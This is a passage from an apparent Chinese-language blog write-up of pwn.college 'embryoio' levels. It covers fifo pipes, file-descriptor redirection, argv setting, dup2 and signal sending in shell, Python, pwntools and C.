tmp，因为这里fifo的特性，只有读写都有才会继续进行，否则会阻塞，所以需要另外查看</span><br></code></pre></td></tr></table></figure><h2 id="level-93"><a class="markdownIt-Anchor" href="#level-93"></a> level 93</h2><blockquote><p>通过两个fifo来创建可交互的双通道</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">shell 脚本</span><br>/challenge/embryoio_level* &lt; t1 &gt; t2 &amp;<br>cat &lt; t2 &amp; # 获取程序向t2的输出到终端<br>cat &gt; t1 # 输入内容给t1<br></code></pre></td></tr></table></figure><p>​这里需要先创建两个fifo管道t1，t2，然后 <code>&amp;</code> 是后台运行。这里通过 <code>cat &lt; t2 &amp; cat &gt; t1</code> 创建了一个可交互的双通道，challenge的输出给了t2，再由 cat &lt; t2 显示到终端，然后终端通过 cat &gt; t1 输入数据到终端，数据给了t1，再由t1给challenge</p><h2 id="level-94"><a class="markdownIt-Anchor" href="#level-94"></a> level 94</h2><blockquote><p>理解exec可以绑定文件描述符</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkfifo</span> t1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exec 82&lt;t1;/challenge/embryoio_level*&#x27;</span> &gt; b.sh<br>bash b.sh &amp; <span class="hljs-built_in">cat</span> &gt; t1  <span class="hljs-comment">#?没搞懂，等会再看看</span><br><span class="hljs-comment"># 之后再输入adbsmqfp</span><br></code></pre></td></tr></table></figure><p>​这里就是cat获取标准输入给t1，然后82文件描述符从t1中获取输入。这里感觉是个幌子，感觉像是这里的输入通过0描述符给了程序，因为82文件描述符没有与程序相关联，在这里更像是将82与0交汇成了一个管道，然后程序从标准输入获取信息也被视为了从82文件描述符获取信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &#x27;adbsmqfp&#x27; &gt; d.sh<br>exec 82 &lt; d.sh # exec可以绑定文件描述符<br>echo &#x27;/challenge/embryoio_level*&#x27; &gt; b.sh<br>bash b.sh 0&lt;&amp;82<br></code></pre></td></tr></table></figure><p>​这里就是将d.sh的内容写入到82文件描述符中，然后再通过运行0&lt;&amp;82将82文件描述符拷贝到0标准输入中，让82 fd的内容作为输入</p><h2 id="level-97"><a class="markdownIt-Anchor" href="#level-97"></a> level 97</h2><blockquote><p>了解linux下信号的知识，可以利用kill命令发送信号</p><p>kill -SIGUSR2 2487可以发送响应信号，注意需要bash <a href="http://b.sh">b.sh</a>&amp;后台启动，或者另起终端来运行kill，因为需要程序的进程存在才可以接收信号</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash b.sh<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">以下是回应</span><br>[TEST] You must send me (PID 2487) the following signals, in exactly this order: [&#x27;SIGINT&#x27;]<br>^C[INFO] Received signal 2! Is it correct?#这里要求发送&#x27;SIGINT&#x27;类型的信号，刚好ctrl+c就是一个，所以就直接通过了<br>[GOOD] Correct!<br>[INFO] Nice, you sent one of the signals!<br>[GOOD] You successfully passed the signal challenges!<br></code></pre></td></tr></table></figure><p>​这里 <code>SIGUSR1/SIGUSR2</code> 通常被用户定义为一个自定义信号，用于进程间通信或执行特定的操作。程序可以捕获和处理这个信号。<code>SIGINT</code> 由终端发送给前台进程组中的所有进程，通常是通过按下键盘上的Ctrl+C来触发。这个信号通常用于请求进程终止。<code>SIGHUP</code> 通常由终端断开连接时发送给进程。在Unix系统中，它可能会导致某些进程重新读取配置文件或进行清理操作。</p><h2 id="level-101"><a class="markdownIt-Anchor" href="#level-101"></a> level 101</h2><blockquote><p>python中设置argv的方法</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br>args = <span class="hljs-string">&quot;/challenge/embryoio_level101&quot;</span><br>argv = <span class="hljs-string">&quot;/tmp/yedczc&quot;</span><br>subprocess.run([argv], executable=args) <span class="hljs-comment">#分别设置参数和可执行文件</span><br></code></pre></td></tr></table></figure><h2 id="level-103-106"><a class="markdownIt-Anchor" href="#level-103-106"></a> level 103-106</h2><blockquote><p>只不过是使用python再用fifo来重定向，与shell脚本差不多</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sehll"># 这是level 106<br>python c.py &lt; t1 &gt; t2 &amp;<br>cat &lt; t2 &amp;<br>cat &gt; t1<br><br># c.py<br>import subprocess,os<br>args = &quot;/challenge/embryoio_level106&quot;<br>subprocess.run(args)<br></code></pre></td></tr></table></figure><h2 id="level-107"><a class="markdownIt-Anchor" href="#level-107"></a> level 107</h2><blockquote><p>注意dup2在python中的使用</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br>fd=os.dup2(<span class="hljs-number">0</span>,<span class="hljs-number">279</span>)<span class="hljs-comment">#将标准输入(文件描述符0)复制到文件描述符279</span><br>args = [<span class="hljs-string">&quot;/challenge/embryoio_level107&quot;</span>]<br><span class="hljs-comment"># stdion=279指定了子进程的标准输入为文件描述符279</span><br><span class="hljs-comment"># pass_fds=[0,1,2,279] 用于将文件描述符传递给子进程。这里传递了标准输入0、标准输出1、标准错误2以及刚刚复制的文件描述符279</span><br>p=subprocess.run(args, stdin=<span class="hljs-number">279</span>, pass_fds=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">279</span>])<br></code></pre></td></tr></table></figure><h2 id="level-114"><a class="markdownIt-Anchor" href="#level-114"></a> level 114</h2><blockquote><p>在c程序中设置argv[0]</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* env[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-type">char</span>* args[] = &#123;<span class="hljs-string">&quot;/tmp/jpvszz&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/challenge/embryoio_level114&quot;</span>, args, env);<span class="hljs-comment">//第一个参数是可执行程序，后面的args是程序的参数</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)&#123;<br>        pwncollege();<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        wait(<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="level-125"><a class="markdownIt-Anchor" href="#level-125"></a> level 125</h2><blockquote><p>两种方法，一种直接使用子进程，另一种使用管道传输数据。虽然都是用python来计算结果</p></blockquote><h3 id="wp1-2"><a class="markdownIt-Anchor" href="#wp1-2"></a> wp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python脚本</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span>  <span class="hljs-comment">#info级别以上的日志会被打印</span><br>r = process([<span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;./b.sh&#x27;</span>])<span class="hljs-comment"># echo &#x27;/challenge/embryoio_level*&#x27; &gt; b.sh</span><br><span class="hljs-comment"># 这里就是创建一个子进程，然后运行bash命令执行脚本，以通过shellscript的检测</span><br>r.recvuntil(<span class="hljs-string">b&quot;you will need to compute responses for.\n&quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        text = r.recv(<span class="hljs-number">1024</span>, timeout=<span class="hljs-number">1</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment"># 接收子进程的输出</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Please send the solution for:&quot;</span> <span class="hljs-keyword">in</span> text:<br>            exp = text[text.find(<span class="hljs-string">&quot;:&quot;</span>)+<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 获取表达式</span><br>            <span class="hljs-comment"># exp = &quot;python -c &quot; + &quot;\&quot;print(&quot; + exp + &quot;)\&quot;&quot;  #这个就是使用python命令行执行了</span><br>            res = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(exp))  <span class="hljs-comment"># 执行表达式</span><br>            log.info(<span class="hljs-string">f&quot;result is: <span class="hljs-subst">&#123;res&#125;</span>&quot;</span>)  <span class="hljs-comment"># 打印执行的结果</span><br>            <span class="hljs-comment"># cal = subprocess.getoutput(exp)  # 这里通过subprocess模块构造的命令来获取输出</span><br>            <span class="hljs-comment"># log.success(cal)  # 打印相应log</span><br>            r.sendline(res)  <span class="hljs-comment"># 将结果发送给子进程</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>                text += r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment">#接收子进程的全部内容</span><br>                log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])  <span class="hljs-comment"># 打印flag</span><br>                <span class="hljs-keyword">break</span><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    log.error(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="wp2-2"><a class="markdownIt-Anchor" href="#wp2-2"></a> wp2</h3><p>​命令行先执行初始操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkfifo t1<br>mkfifo t2<br>echo &#x27;/challenge/embryoio_level* &gt; t1 &lt; t2 &amp; python c.py&#x27; &gt; b.sh<br></code></pre></td></tr></table></figure><p>​python脚本如下，然后直接运行 <code>bash b.sh</code> 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./t1&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)  <span class="hljs-comment"># 利用t1通道进行输入数据</span><br>f2=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./t2&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)  <span class="hljs-comment"># t2通道输出数据</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>    s=f1.readline()<br>    <span class="hljs-built_in">print</span>(s)<br>    index=s.find(<span class="hljs-string">b&quot;r: &quot;</span>)  <span class="hljs-comment"># 如果有这个标志说明这一行是需要运算的，注意这里的r，不加的话会匹配到前面的一个&quot;: &quot;然后报错</span><br>    <span class="hljs-keyword">if</span> index != -<span class="hljs-number">1</span>:<br>        exp=s[index+<span class="hljs-number">3</span>:-<span class="hljs-number">1</span>] <span class="hljs-comment">#&quot;r: &quot;总共3个字符，后面才是表达式</span><br>        res=<span class="hljs-built_in">eval</span>(exp)  <span class="hljs-comment"># 运算得到结果</span><br>        f2.write(<span class="hljs-string">b&quot;%d\n&quot;</span> %res)  <span class="hljs-comment"># 写入t2传回结果</span><br>        f2.flush()  <span class="hljs-comment"># 缓冲区清空需要加，不加这一行原程序得不到我们的运行结果</span><br>f1.close()<br>f2.close()<br></code></pre></td></tr></table></figure><h2 id="level-126"><a class="markdownIt-Anchor" href="#level-126"></a> level 126</h2><blockquote><p>这次计算的是500个表达式，其中会有很长的式子</p></blockquote><p>​对于wp1，只需要将接收的字符串从 <code>1024</code> 增长到 <code>10240</code> 就可以通过，这里表达式太长了，1024字节不够。而对于wp2，升级一下脚本，主要是过滤一下输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./t1&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<span class="hljs-comment">#利用t1通道进行输入数据</span><br>f2=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./t2&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<span class="hljs-comment">#t2通道输出数据</span><br><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3000</span>):<br>    s=f1.readline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span> &gt;=<span class="hljs-number">500</span>: <span class="hljs-comment"># sum用来统计计算的表达式有没有到500个，到了就输出后面读到的内容，没有不输出了，让程序运行的快一点</span><br>        <span class="hljs-comment"># print(s)  # 没什么必要，主要是看读取的数据</span><br>        <span class="hljs-built_in">print</span>(f1.read())<br>        <span class="hljs-keyword">break</span><br>    index=s.find(<span class="hljs-string">b&quot;r: &quot;</span>)  <span class="hljs-comment">#如果有这个标志说明这一行是需要运算的</span><br>    <span class="hljs-keyword">if</span> index != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">sum</span>+=<span class="hljs-number">1</span><br>        exp=s[index+<span class="hljs-number">3</span>:-<span class="hljs-number">1</span>] <span class="hljs-comment">#&quot;r: &quot;总共3个字符，后面才是表达式</span><br>        res=<span class="hljs-built_in">eval</span>(exp)  <span class="hljs-comment"># 运算得到结果</span><br>        f2.write(<span class="hljs-string">b&quot;%d\n&quot;</span> %res)  <span class="hljs-comment"># 写入t2传回结果</span><br>        f2.flush()  <span class="hljs-comment"># 缓冲区清空需要加，不加这一行原程序得不到我们的运行结果</span><br>f1.close()<br>f2.close()<br></code></pre></td></tr></table></figure><h2 id="level-127"><a class="markdownIt-Anchor" href="#level-127"></a> level 127</h2><blockquote><p>使用python来批量发送信号</p></blockquote><p>​运行 <code>bash b.sh &amp;</code>，然后再运行 <code>python c.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br>sig = [<span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR2&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR2&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR2&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR2&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sig:<br>    code=<span class="hljs-string">&quot;kill &quot;</span>+<span class="hljs-string">&quot;-&quot;</span>+i[<span class="hljs-number">3</span>:]+<span class="hljs-string">&quot; 2992&quot;</span>  <span class="hljs-comment"># 这里如果直接使用i来作为参数会报错&#x27;/bin/sh: 1: kill: Illegal option -S&#x27;，gpt说这是因为古老的linux不支持-S选项，所以去掉前面的SIG，遮掩古老的linux可以识别了</span><br>    <span class="hljs-built_in">print</span>(code)<br>    subprocess.run(code,shell=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>​另一种使用pwntools的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>r = process([<span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;./b.sh&#x27;</span>])<br><br>r.recvuntil(<span class="hljs-string">b&quot;[TEST] You must send me (PID &quot;</span>)<br>pid = <span class="hljs-built_in">int</span>((r.recvuntil(<span class="hljs-string">&quot;)&quot;</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>))[:-<span class="hljs-number">1</span>], <span class="hljs-number">10</span>)  <span class="hljs-comment"># 获取pid，转化为十进制</span><br>log.success(<span class="hljs-string">&quot;pid = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(pid)))<br>r.recvuntil(<span class="hljs-string">b&quot;in exactly this order: [&#x27;&quot;</span>)<br><br>signals = (r.recvuntil(<span class="hljs-string">b&quot;&#x27;]&quot;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))[:-<span class="hljs-number">2</span>]<br>signal_list = signals.split(<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(signal_list)<br><br>signal_all = [<span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGQUIT&#x27;</span>, <span class="hljs-string">&#x27;SIGILL&#x27;</span>, <span class="hljs-string">&#x27;SIGTRAP&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGBUS&#x27;</span>, <span class="hljs-string">&#x27;SIGFPE&#x27;</span>, <span class="hljs-string">&#x27;SIGKILL&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGSEGV&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR2&#x27;</span>, <span class="hljs-string">&#x27;SIGPIPE&#x27;</span>, <span class="hljs-string">&#x27;SIGALRM&#x27;</span>, <span class="hljs-string">&#x27;SIGTERM&#x27;</span>, <span class="hljs-string">&#x27;SIGSTKFLT&#x27;</span>, <span class="hljs-string">&#x27;SIGCHLD&#x27;</span>, <span class="hljs-string">&#x27;SIGCONT&#x27;</span>, <span class="hljs-string">&#x27;SIGSTOP&#x27;</span>, <span class="hljs-string">&#x27;SIGTSTP&#x27;</span>, <span class="hljs-string">&#x27;SIGTTIN&#x27;</span>, <span class="hljs-string">&#x27;SIGTTOU&#x27;</span>, <span class="hljs-string">&#x27;SIGURG&#x27;</span>, <span class="hljs-string">&#x27;SIGXCPU&#x27;</span>, <span class="hljs-string">&#x27;SIGXFSZ&#x27;</span>, <span class="hljs-string">&#x27;SIGVTALRM&#x27;</span>, <span class="hljs-string">&#x27;SIGPROF&#x27;</span>, <span class="hljs-string">&#x27;SIGWINCH&#x27;</span>, <span class="hljs-string">&#x27;SIGIO&#x27;</span>, <span class="hljs-string">&#x27;SIGPWR&#x27;</span>, <span class="hljs-string">&#x27;SIGSYS&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+1&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+2&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+3&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+4&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+5&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+6&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+7&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+8&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+9&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+10&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+11&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+12&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+13&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+14&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+15&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-14&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-13&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-12&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-11&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-10&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-9&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-8&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-7&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-6&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-5&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-4&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-3&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-2&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-1&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX&#x27;</span>]<br><span class="hljs-keyword">for</span> signal <span class="hljs-keyword">in</span> signal_list:<br>    num = signal_all.index(signal)+<span class="hljs-number">1</span><br>    <span class="hljs-comment"># log.info(&quot;num=&gt;&#123;&#125;&quot;.format(str(num)))</span><br>    exp = <span class="hljs-string">&quot;kill -&quot;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-built_in">str</span>(pid) <span class="hljs-comment"># 这里是每个信号都对应一个标号，按标号一样的效果</span><br>    log.info(exp)<br>    subprocess.getoutput(exp)<br>    r.recv()<br><br>text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>    log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">else</span>:<br>    exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="level-129"><a class="markdownIt-Anchor" href="#level-129"></a> level 129</h2><blockquote><p>控制输入输出流</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">shell脚本，套用level 126的管道例子，不过记得修改处理表达式数量<span class="hljs-built_in">sum</span></span><br>cat &lt; t2 | /challenge/embryoio_level* | cat &gt; t1 &amp; python c.py<br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里让<span class="hljs-built_in">cat</span>从t2接收数据，传递给程序，再由程序输出给<span 